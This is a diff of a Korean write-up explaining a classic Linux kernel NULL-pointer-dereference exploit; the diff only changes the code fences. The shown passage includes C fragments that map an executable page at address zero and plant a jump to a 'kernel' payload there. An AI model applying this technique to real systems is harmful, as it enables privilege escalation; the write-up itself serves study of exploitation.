@@ -14,23 +14,23 @@ Exploit 자체는 꽤 클래식해서 정리해놓을 가치가 있다고 생각
 
 #### Exploit
 
-'''
+```
 	...
 	if ((zero_page = mmap(0x00000000,0x1000,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE,0,0)) == MAP_FAILED) {
 		...
 	}
-'''
+```
 
 0x0 에 4096 bytes 짜리 메모리 페이지를 할당한다.
 
 그리고, payload 를 담고있는 변수의 주소를 0x00000002,0x3,0x4,0x5 에 깐다.
 
-'''
+```
 	*(char *)0x00000000 = 0xff;
 	*(char *)0x00000001 = 0x25;
 	*(unsigned long *)0x00000002 = (unsigned long)&kernel;
 	*(char *)0x00000006 = 0xc3;
-'''
+```
 
 버그가 trigger 되면 `fp = *(unsigned long)(*(unsigned long)((0x00000000)->0x2)); (*fp)();` 하는 모양.
 
